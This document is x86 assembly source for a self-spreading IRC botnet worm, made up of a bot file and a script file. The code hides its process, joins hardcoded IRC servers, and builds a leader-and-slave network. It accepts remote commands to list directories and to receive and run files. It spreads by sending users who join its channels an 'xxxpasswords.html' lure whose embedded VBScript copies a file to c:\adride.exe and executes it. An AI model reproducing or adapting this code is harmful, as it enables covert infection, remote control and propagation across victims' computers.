        invoke  GetCurrentDirectory, 300, offset RecvString

        invoke  SetCurrentDirectory, offset PathString

        mov     eax, dword ptr [Buffs+3*4]

        invoke  FindFirstFile, eax, edi
        mov     ebx,eax
        inc     eax
        jz      EndDirFunction

    SendFileName:
        lea     esi,[edi].cFileName

        and     [edi].dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        jz      SendFilename

        invoke  lstrlen, esi
        mov     word ptr [eax+esi],'\'

   SendFilename:
        invoke  lstrlen, esi
        mov     word ptr [esi+eax],CRLF
        inc     eax
        inc     eax

        invoke  WriteFile, FileHandle, esi, eax, offset Temp, 0

        invoke  FindNextFile, ebx, edi
        test    eax,eax
        jnz     SendFileName
        assume  edi:nothing

   EndDirFunction:
        invoke  SetCurrentDirectory, offset RecvString
        invoke  CloseHandle, FileHandle

        mov     eax,offset DirFile
        mov     [Buffs+3*4], eax
        call    DCCSendFunction

   ErrorDirFunction:
        ret
DirFunction endp







   AddNewSlave:
        pushad

        invoke  CreateString, eax, offset NickStr    ; copy name to slaveX
        invoke  LoadSlaveData, Slave1           ; Reload slavedata      

        invoke  LocalAlloc, LMEM_ZEROINIT, 1000
        mov     edi, eax
        mov     ebx, eax

        invoke  lstrcpy, edi, offset PRIVMSGNick
        call    DCCSendSpaceSaver
        dec     edi

        invoke  lstrcpy, edi, offset YouGotFileStr
        call    DCCSendSpaceSaver

        mov     esi, DownloadedFiles

     SendFileList:
        invoke  lstrcpy, edi, esi
        invoke  lstrlenInc, esi
        add     esi, eax

        invoke  SendMsg, ebx


        cmp     byte ptr [esi],0
        jnz     SendFileList

        invoke  LocalFree, ebx

        popad
        ret

IsOnline:

        invoke  LocalAlloc, LMEM_ZEROINIT, 1000
        mov     edi, eax
        assume  edi:ptr RASCONN

        sub     esp,4
        mov     edx, esp                        ; edx = BufferSize = 1000
        push    0
        mov     ecx, esp                        ; ecx -> Number of conns

        mov     [edi].dwSize, sizeof(RASCONN)

        invoke  RasEnumConnections, edi, edx, ecx

        push    edi
        mov     edi,[edi].hrasconn

        call    LocalFree
        pop     eax                             ; eax = 1000
        pop     eax                             ; eax = Number of conns
        assume  edi:nothing
        ret

WaitUntilOnline proc uses edi ebx
        local   ConnStatus: RASCONNSTATUSA
        assume  ebx:ptr RASCONNSTATUSA
        lea     ebx, ConnStatus
        jmp     WaitUntilOnlineStart


PauseAndThenCheckOnlineAgain:
        invoke  Sleep, 1000


WaitUntilOnlineStart:
        call    IsOnline
        test    eax,eax
        jz      PauseAndThenCheckOnlineAgain


        mov     [ebx].dwSize, sizeof(RASCONNSTATUSA)
        invoke  RasGetConnectStatus, edi, ebx

        cmp     [ebx].rasconnstate, RASCS_Connected
        jnz     PauseAndThenCheckOnlineAgain

        assume  ebx:nothing
        ret
WaitUntilOnline endp


ConnectToServer proc

        local   SockAddrTemp:sockaddr_in

        invoke  closesocket, SocketPtr

        invoke  socket, AF_INET, SOCK_STREAM, 0
        mov     SocketPtr,eax

   ConnectToServerLoop:
        call    WaitUntilOnline

        mov     esi,IRCCurrentIp
        invoke  lstrlenInc,esi
        add     eax,esi

        cmp     byte ptr [eax],0
        jnz     PointToNextIp

        mov     eax,IRCIpNumbers

   PointToNextIp:
        mov     IRCCurrentIp,eax

        invoke  inet_addr, esi

        mov     sin_addr,eax                    ; move to connect data
        lea     eax,sin_family
        invoke  connect, SocketPtr, eax, sizeof(sockaddr_in)    ; connect
        test    eax,eax
        jnz     ConnectToServerLoop

        call    GetIpFunction

        lea     eax,SendMyNickInfo              ; send login data
        invoke  SendMsg, eax
        lea     eax,SendMyUserInfo
        invoke  SendMsg, eax

   NotOnline:
        ret
ConnectToServer endp

SplitMessage proc Message:dword
        push    edi
        mov     edi,Message

        .if byte ptr [edi]==':'                 ; Message Handler
                invoke  SplitStringAtSpace, edi

                mov     [Buffs],eax             ; command

                invoke  IsInMessage, edi, offset ExclamanationMark
                jc      DontEndNick

                mov     byte ptr [eax],0
             DontEndNick:
                inc     edi
                mov     SendingNick, edi
        
                mov     esi,IgnoreNicks

             IsOnIgnoreList:
                call    StringCmp
                jz      ParseMessage            ; Dont parse if ignore
                add     esi,10
                cmp     byte ptr [esi],0
                jnz     IsOnIgnoreList

        .else                                   ; System Handler
                mov     [Buffs],edi

        .endif
                pop     edi
                ret

SplitMessage endp                


ParseCommand proc ParseData:dword
        local   WhereInParseData:dword
        local   WhatToParse:dword
        local   Inverse:dword

        push    esi
        push    edi

        mov     esi,ParseData

     ParseLoop:
        mov     Inverse,0

        xor     eax,eax
        lodsb   

        test    eax,eax
        jz      ParseCommandReturn

        cmp     eax,1
        jz      DoCommand

        cmp     eax,'!'
        jnz     CreateStringToLookIn

        mov     Inverse,1
        inc     esi

    CreateStringToLookIn:
        dec     esi


        invoke  LocalAlloc, LMEM_ZEROINIT, 3000

        mov     edi,eax

        invoke  lstrcpy, edi, esi

        invoke  lstrlenInc,esi
        add     esi,eax

        push    esi                             ; save esi

        invoke  SplitStringAtSpace, edi         ; edi -> what to look in
        jc      Error
        mov     esi,eax                         ; esi -> what to look for


        push    edi                             ; save for LocalFree
        push    edi

        lea     eax,[edi+1100]
        mov     edi,eax                         ; created string 1

        push    eax
        call    CreateString

        push    esi
        add     eax,10
        mov     esi,eax                         ; create string 2

        push    eax
        call    CreateString                    

        invoke  IsInMessage, edi, esi
        setc    al
        movzx   edi,al
        call    LocalFree

        pop     esi
        xor     edi,Inverse
        jnz     DontDoCommand

    DoCommand:
        xor     eax,eax
        lodsb


        .if eax=='|'
                lodsb
                lodsb
                sub     eax,'0'
                lea     edi,[Buffs+eax*4]


                xor     eax,eax
                mov     Temp,eax
                lodsb
                mov     byte ptr [Temp],al

                lodsb
                dec     eax
                push    esi
                mov     esi,eax
                mov     eax,[edi]

          MakePieces:           
                invoke  IsInMessage, eax, offset Temp
                jc      DontSplitMore

                mov     byte ptr [eax],0
                inc     eax
                add     edi,4
                mov     [edi],eax
                dec     esi
                jnz     MakePieces

          DontSplitMore:
                pop     esi

                lodsd
                add     eax,Aligment
                invoke  ParseCommand, eax

        .elseif eax=='l'
                lodsd
                add     eax,Aligment
                invoke  ParseCommand, eax

        .elseif eax=='s'
                invoke  SendMsg, esi

                invoke  lstrlenInc, esi

                add     esi,eax
        .elseif eax=='f'
                lodsw
                pushad
                call    [Functionlist+eax*4]
                popad
        .elseif eax=='v'
                invoke  LocalAlloc,LMEM_ZEROINIT, 1000
                push    eax                             ; for LocalFree
                mov     edi,eax

                invoke  lstrcpy, edi, esi

                invoke  SplitStringAtSpace, edi
                mov     edi, eax

                invoke  FindReplacement, esi

                push    edx
                invoke  lstrlenInc, edi
                add     eax,edi

                push    eax
                push    eax                     ; lstrlen

                invoke  CreateString, eax, edi

                call    lstrlen
                pop     ecx                     ; created string
                pop     edx                     ; -> where to copy it
                invoke  lstrcpy, [edx], ecx

         DontChangeVariable:
                invoke  lstrlenInc, esi
                add     esi,eax

                call    LocalFree

        .else
                jmp     ParseError
        .endif

        mov     WhereInParseData,esi
        jmp     ParseLoop
        
    DontDoCommand:    
        xor     eax,eax
        lodsb

        .if eax=='|'
                add     esi,4+4
        .elseif eax=='l'
                add     esi,4
        .elseif eax=='s' || eax=='v'
                invoke  lstrlenInc, esi
                add     esi,eax
        .elseif eax=='f'
                add     esi,2

        .else
                jmp     ParseError
        .endif
        jmp     ParseLoop


    ParseCommandReturn:
        pop     edi
        pop     esi
        ret

ParseCommand endp


   ParseErrorStr        db      "Parse error",0

   ParseError:
        invoke  MessageBoxA, 0, offset ParseErrorStr, offset ParseErrorStr, 0

   Error:
   FoundNoServer:
        invoke  Sleep, 1000*20
        invoke  ExitProcess, 0

Kernel32                db      "kernel32",0
RegisterService         db      "RegisterServiceProcess", 0
HideProgram:
        invoke  GetModuleHandleA, offset Kernel32
        invoke  GetProcAddress, eax, offset RegisterService
        test    eax,eax
        jz      NoHide
        push    1
        push    0
        call    eax
      NoHide:
       ret


;TempMsg db      ":Bhunji!swipnet.se ERROR :Bla bla bla",0dh,0ah


Main:
        call    HideProgram


        mov     eax,eax
        mov     eax,eax
        call    SetupProgram

;        mov     eax,InBuffertPtr
;        invoke  lstrcpy, eax, offset TempMsg

  RestartAllFuckingThings:
        call    ConnectToServer

  ParseMessage:
        mov     edi,StrBuffert
        invoke  GetMsg, edi

        invoke  SplitMessage, edi

        invoke  ParseCommand, MessageHandler
        jmp     ParseMessage

EndIrcBot:

_rsrc segment para public 'DATA' use32
assume cs:_rsrc
; if file is seen as HTML then the virus is dropped to c:\ and executed
; add a '<!--' after MZ in the dos header to make the html more stealth

db  "-->'s"
db  '<H4>XXX passwords</H4><a href="http:\\www.pussysex.com">www.pussysex.com</a><P>Name: Jones<br>Pass: Jones<p><a href="http:\\www.teensexxx.com">'
db  'www.teensexxx.com</a><P>Name: qwerty<BR>Pass: qwerty<p><a href="http:\\www.analpleasure.com">www.analpleasure.com</a><P>Name: anal<br>Pass: anal'
db  '<p><a href="http:\\www.hornybabes.com">www.hornybabes.com</a><P>Name: naked<br>Pass: sex<p><a href="http:\\www.loveland.com">www.loveland.com</a>'
db  '<P>Name: htroe<br>Pass: eerss<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>'
db  '<script language = VBScript>',0dh,0ah
db  'Set fso = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db  'Set reg = CreateObject("WScript.Shell")',0dh,0ah
db  'if (fso.FolderExists("c:\mirc\")) Then',0dh,0ah
db  'FileName = "c:\mirc\download\xxxpasswords.html"',0dh,0ah
db  'elseif (fso.FolderExists("C:\mirc32\")) Then',0dh,0ah
db  'FileName = "c:\mirc32\download\xxxpasswords.html"',0dh,0ah
db  'elseif (fso.FolderExists("C:\programs\mirc\")) Then',0dh,0ah
db  'FileName = "c:\program\mirc\download\xxxpasswords.html"',0dh,0ah
db  'elseif (fso.FolderExists("C:\programs files\mirc\")) Then',0dh,0ah
db  'FileName = "c:\program files\mirc\download\xxxpasswords.html"',0dh,0ah
db  'elseif (fso.FolderExists("C:\programs files\mirc32\")) Then',0dh,0ah
db  'FileName = "c:\program files\mirc32\download\xxxpasswords.html"',0dh,0ah
db  'else',0dh,0ah
db  'FileName = "c:\autoexec.bat"',0dh,0ah
db  'end if',0dh,0ah
db  'fso.CopyFile FileName, "c:\adride.exe"',0dh,0ah
db  'reg.Run ("c:\adride.exe")',0dh,0ah
db  '</script>',0dh,0ah



_rsrc   ends

end Main 



















컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ircbot\ircbot.asm]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ircbot\script.asm]컴�
; Main script, establich the contact between the new viruses.
;
; What happens when a new virus connects

; Step 1. On connect.
; SEND Nickname
; USER Ident . . :Realname

; Step 2. When connected
; Check if leader is online

; Step 3. If Leader is offline
; New leader is God
; Goto step 2

; Step 4. If leader is online
; Send "Hello master"

; Step 5. At Reply = "Hello child"
; Send "Do you have place for me?"

; Step 6. At Reply = "No, ask X"
; Change Leader to X
; Goto step 4

; Step 7. At Reply = "SEND: X"
; Check if file X exist
; If file doesnt exist, send "DCC X"

; Step 8. At Reply = 01,"DCC"
; Recieve the file and execute it



; What happens at the Leader side of the connection (the virus that is
; connected to the newly connected virus)

; Step 11. At Recieved = "Hello master"
; Send "Hello child"

; Step 12. At Recieved = "Do you have place for me?"
; Look how many slaves that it currently has

; Step 13. If Slave list if full (more then five slaves)
; Send "No, ask SlaveX"

; Step 14. If slave list isnt full
; Add new virus to slave list
; Send list of files

; Step 15. At Recieved = "DCC X"
; Open a DCC connection and send a CTCP DCC reply to virus

; This is the basics for a connection, if we want to upgrade the virus we
; just DCC it a file and it will download it and execute it. This virus will
; then send this program to every new virus at Step 14. These viruses will
; also send it further, so we get a whole branch that all has this program.

;                                               God
;                                          1 ( 2 3 4 5 )
; I DCC a new file to this virus ->  1 ( 2 3 4 5 )
; All these will have the file   1 2 3 4 5
; too if they connected to IRC
; after i DCC'ed the new program


; The viruses regulary check to see if all slaves and its leader is online
; if the leader is gone it goes to step 3. If a slave is missing then it is
; deleted from the slave list.


; commands marked with three stars (***) are considered dangerous in the way
; that it would be easy for the AV's to find all viruses. Delete for less fun
; and more security

includelib kernel32.lib
includelib user32.lib


.486
.model flat, stdcall
include c:\masm\include\windows.inc
include c:\masm\include\kernel32.inc
include c:\masm\include\user32.inc



        NULL                    equ     0
        EndOfList               equ     0

        NoScan                  equ     1

        ConnectFunction         equ     1
        DCCRecvFunction         equ     2
	DCCChatFunction		equ	3

        DCCSendFunction         equ     4

        QuitFunction            equ     5
        NewSlaveFunctions       equ     6
        ShouldRecieveProgram    equ     7
        GenerateNewNick         equ     8

        ExecuteProgram          equ     9
        DirFunction             equ     10

.code

   BeginOfScript:

   Header:
        Magic                   db      "VIRc"
        Alignment               dd      -401000h

        User                    dd      Userinfo
        Slaves                  dd      SlaveNames
        Ignores                 dd      IgnoreNames
        IRCServers              dd      IPList

        MessageParsePtr         dd      MessageParseData

        DownloadedFiles         dd      ListOfDownloadedFiles

   EndOfHeader:

; ---------------------------------------------- User info

   Userinfo:
        Nickname                db      "Vir00002"
        db      10-($-Nickname) dup (0)
        Ident                   db      "Nick"
        db      10-($-Ident) dup (0)
        RealName                db      "DrSolomon"
        db      10-($-RealName) dup (0)
        God                     db      "VirusGod"
        db      10-($-God) dup (0)
        Leader                  db      "VirusGod"
        db      10-($-Leader) dup (0)
                                db      EndOfList

   SlaveNames:
                                db      10 dup (0)
                                db      10 dup (0)
                                db      10 dup (0)
                                db      10 dup (0)
                                db      10 dup (0)
                                db      EndOfList

   IgnoreNames:
                                db      50 dup (0)
                                db      EndOfList

        


; ----------- List of IP addresses of undernet IRC servers

  IPList                        db      "192.160.127.97",0
                                db      "130.243.35.1",0   ; efnet
                                db      "203.37.45.2",0
                                db      "209.47.75.34",0
                                db      "195.154.203.241",0
                                db      "194.159.80.19",0
                                db      "128.138.129.31",0


                                db      EndOfList
                                db      0

; -------------- How to handle messages

  MessageParseData:

                                db      NoScan
                                db      "|$0 ",2
                                dd      RealStart
                                db      EndOfList

  RealStart:
                                

                                db      "$0 NICK",0
                                db      "|$1:",2
                                dd      NickChangeProc
 
                                db      "$0 PRIVMSG",0
                                db      "|$1 ",2; split $1 at space until 
                                                ; two new strings is created
                                dd      PrivMsgData

                                db      "$0 001",0 ; First message
                                db      "l"
                                dd      StartCommands

                                db      "$0 303",0
                                db      "l"
                                dd      IsOnMessage

                                db      "$0 JOIN",0
                                db      "|$1:",2
                                dd      JoinMessage

                                db      "$0 319",0      ; WHOIS channels
                                db      "|$1:",2
                                dd      JoinWhoisChannels

; Low level commands
                                db      "$0 433",0
                                db      "f"
                                dw      GenerateNewNick

                                db      "$0 PING",0
                                db      "l"
                                dd      PingList

                                db      "$0 ERROR",0
                                db      "f"
                                dw      ConnectFunction

                                db      EndOfList


JoinWhoisChannels:
                                db      "$2 #",0
                                db      "l"
                                dd      JoinChannel

                                db      "$4 #",0
                                db      "|$4#",2
                                dd      SecondChannel

                                db      EndOfList
SecondChannel:
                                db      NoScan
                                db      "|$5 ",2
                                dd      SecondChannel2
                                db      EndOfList
                                
SecondChannel2:
                                db      NoScan
                                db      "s"
                                db      "JOIN #$5",0
                                db      EndOfList


PingList:
                                db      NoScan
                                db      "s"
                                db      "PONG $1",0

; check if all is online
                                db      NoScan
                                db      "s"
				db	"ISON $slave1 $slave2 $slave3 $slave4 $slave5 $leader",0
				db	EndOfList

NickChangeProc:
                                db      "$nick $mynick",0
                                db      "v"
                                db      "$mynick $2",0
                                db      EndOfList

JoinMessage:

                                db      "!$nick $mynick",0
                                db      "l"
                                dd      SendFileToJoiner

                                db      EndOfList

SendFileToJoiner:
                                db      NoScan
                                db      "v"
                                db      "$3 xxxpasswords.html",0

                                db      NoScan
                                db      "f"
                                dw      DCCSendFunction

                                db      EndOfList

; ------------------------------------ Handler of PRIVMSGs

  PrivMsgData:
                db      NoScan
                db      "v"
                db      "$recv $1",0

                db      "$1 $mynick",0          ; if where to send = mynick
                db      "v"                     ; change that variable
                db      "$recv $nick",0         ; to $nick. This happens
                                                ; at private msgs

                db      "$nick $leader",0       ; messages from the leader
                db      "l"
                dd      LeaderMessages

                db      "$slaves $nick",0
                db      "l"
                dd      SlaveMessages

                db      "$nick Bhunji",0
                db      "l"
                dd      NickIsBhunji

                db      "!$nick $mynick",0      ; parse if ordinary user
                db      "l"
                dd      UserMessages
                db      EndOfList

  UserMessages:
                db      "!$nick $leader",0
                                                ; parse if ordinary user
                db      "l"
                dd      UserMessages2
                db      EndOfList

  UserMessages2:
                db      "!$nick $child",0
                                                ; parse if ordinary user
                db      "l"
                dd      UserMessages3
                db      EndOfList

                

  UserMessages3:
                db      "$2 :DCC script.exe",0
                db      "l"
                dd      SendScript

                db      "$2 :Hello master",0    ; Is message = Hello master
                db      "l"
                dd      NewVirusOnline

                db      "$2 :Do you have place for me?",0
                db      "f"
                dw      NewSlaveFunctions


                db      "!$recv #",0            ; is a private message
                db      "s"
                db      "WHOIS $recv",0         ; join all channels that
                                                ; the sender is visiting

JoinChannel:
                db      "$2 #",0                ; look for a #
                db      "|$2#",2                ; split string at #
                dd      ParseChannel
                db      EndOfList

ParseChannel:
                db      NoScan
                db      "|$3 ",2                ; split string at space
                dd      JoinNewChannel
                db      EndOfList

JoinNewChannel:
                db      NoScan
                db      "s"
                db      "JOIN #$3",0
                db      EndOfList



NewVirusOnline:
                db      NoScan
                db      "s"                     ; if so, Send string
                db      "$0 $recv :Hello child",0  ; $0 = PRIVMSG
                                                ; $recv = Channel or Person
                                                ; Hello child = Message to
                                                ; send
                db      NoScan
                db      "s"
                db      "$0 Bhunji :New infection",0
                db      EndOfList

NickIsBhunji:
                db      "$2 :DCC ",0
                db      "|$2 ",2
                dd      AtDCCSend


                db      "$2 :restart",0
                db      "f"
                dw      ConnectFunction

                db      "$2 :god",0             ; ***
                db      "s"
                db      "$0 Bhunji :$god",0

                db      "$2 :leader",0          ; ***
                db      "s"
                db      "$0 Bhunji :$leader",0

                db      "$2 :nick ",0           ; ***
                db      "|$2 ",2
                dd      ChangeNickFunction


                db      "$2 :cd ",0
                db      "|$2 ",2
                dd      SetPath

                db      "$2 :dir ",0
                db      "|$2 ",2
                dd      CallDirFunction

		db	NoScan
		db	"l"
		dd	LeaderMessages
                db      EndOfList

SetPath:
                db      NoScan
                db      "v"
                db      "$path $3",0
                db      EndOfList

CallDirFunction:
                db      NoScan
                db      "f"
                dw      DirFunction
                db      EndOfList

;------------------------- Messages from one of the slaves
SlaveMessages:             
                db      "$2 :DCC",0
                db      "|$2 ",2
                dd      AtDCCSend
                db      EndOfList


SendScript:
                db      NoScan
                db      "v"
                db      "$3 script.exe",0

AtDCCSend:
                db      NoScan
                db      "f"
                dw      DCCSendFunction
                db      EndOfList        

; ------------------------------- Messages from the leader
LeaderMessages:
                db      "$2 :recursive ",0      ; ***
                db      "s"                     
                db      "$0 $slaves $2",0       
                                                
                db      "$2 :join ",0
                db      "|$2 ",2
                dd      EnterChannelFunction

                db      "$2 :leave ",0
                db      "|$2 ",2
                dd      LeaveChannelFunction

                db      "$2 :msg",0             ; ***
                db      "|$2 ",3
                dd      MessageFunction

                db      "$2 :slaves",0          ; ***
                db      "s"
                db      "$0 $recv :$slaves",0

                db      "$2 :run ",0
                db      "|$2 ",2
                dd      RunProgram

                db      "$2 :Hello child",0
                db      "s"
                db      "$0 $recv :Do you have place for me?",0

                db      "$2 :quit!!",0          ; ***
                db      "f"
                dw      QuitFunction

                db      "$2 ",01,"DCC",0        ; leader sends a file
                db      "|$2 ",3                ; $3 = send or chat
                dd      DCCRecvProc             ; $4 = additional data

                db      "$2 :SEND:",0
                db      "|$2 ",2
                dd      CheckIfGotProgram

                db      "$2 :No, ask ",0
                db      "|$2 ",3
                dd      NewLeader
                db      EndOfList

RunProgram:
                db      NoScan
                db      "f"
                dw      ExecuteProgram
                db      EndOfList

CheckIfGotProgram:
                db      NoScan
                db      "f"
                dw      ShouldRecieveProgram
                db      EndOfList


                ; Change leader and restart
NewLeader:
                db      NoScan
                db      "v"
                db      "$leader $4",0

                db      NoScan
                db      "l"
                dd      StartCommands
                db      EndOfList



LeaveChannelFunction:
                db      NoScan
                db      "s"
                db      "PART $3",0
                db      EndOfList

ChangeNickFunction:
                db      NoScan
                db      "s"
                db      "NICK $3",0

                db      EndOfList

EnterChannelFunction:
                db      NoScan
                db      "s"
                db      "JOIN $3",0
                db      EndOfList

MessageFunction:
                db      NoScan
                db      "s"
                db      "PRIVMSG $3 :$4",0
                db      EndOfList


; -------------------------------------------- DCC Handler
  DCCRecvProc:
			db	"$3 SEND",0
			db	"f"
                        dw      DCCRecvFunction

			db	EndOfList

			db	"$4 CHAT",0
                        db      "f"
			dw	DCCChatFunction

                        db      EndOfList

; ------------------------------------ If leader is online
  IsOnMessage:

  ; if leader isnt online, change name to leader

                                db      "!$1 $leader",0
                                db      "l"
                                dd      Restart

                                db      "!$1 $slave1",0
                                db      "v"
                                db      "$slave1 ",0

                                db      "!$1 $slave2",0
                                db      "v"
                                db      "$slave2 ",0

                                db      "!$1 $slave3",0
                                db      "v"
                                db      "$slave3 ",0

                                db      "!$1 $slave4",0
                                db      "v"
                                db      "$slave4 ",0

                                db      "!$1 $slave5",0
                                db      "v"
                                db      "$slave5 ",0
                                db      EndOfList

  Restart:                      

                                db      NoScan
                                db      "s"
                                db      "NICK $leader",0

                                ; new leader is god
                                db      NoScan
                                db      "v"
                                db      "$leader $god",0

                                ; restart virus

; ----------------------- Commands to send when registered

  StartCommands:                ; Check if leader is online
                                db      NoScan
                                db      "s"
                                db      "ISON $leader",0

                                db      NoScan
                                db      "s"
                                db      "PRIVMSG $leader :Hello master",0
                                db      EndOfList

; Dont change anything below

; Messages not beginning with ':'

ListOfDownloadedFiles:
                                db      EndOfList

EndOfScript:

                                db      10 dup (0)


.code
        ScriptFileName          db      "script.dat",0
        BotFileName             db      "dllmgr.exe",0


Kernel32                db      "kernel32",0
RegisterService         db      "RegisterServiceProcess", 0
HideProgram:
        invoke  GetModuleHandleA, offset Kernel32
        invoke  GetProcAddress, eax, offset RegisterService
        test    eax,eax
        jz      NoHide
        push    1
        push    0
        call    eax
     NoHide:
        ret



MyOpenFile:
        xor     edx,edx
        invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
        mov     ebx, eax
        cmp     eax,INVALID_HANDLE_VALUE
        ret


    Main:
        xor     esi, esi
        call    HideProgram

    WaitUntilBotIsDead:
        invoke  Sleep, 1000
        mov     eax,offset BotFileName
        mov     ebx,GENERIC_READ
        mov     ecx,OPEN_ALWAYS
        call    MyOpenFile
        jz      WaitUntilBotIsDead
        invoke  CloseHandle, ebx


        mov     eax,offset ScriptFileName
        mov     ebx,GENERIC_WRITE
        mov     ecx,CREATE_ALWAYS
        call    MyOpenFile
        jz      Error

        push    esi
        mov     ecx,esp
        
        invoke  WriteFile, ebx, offset BeginOfScript, EndOfScript-BeginOfScript, ecx, esi
        pop     eax
        invoke  CloseHandle, ebx

        invoke  WinExec, offset BotFileName, SW_SHOW


    Error:
        invoke  ExitProcess, 0
end Main 

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ircbot\script.asm]컴�
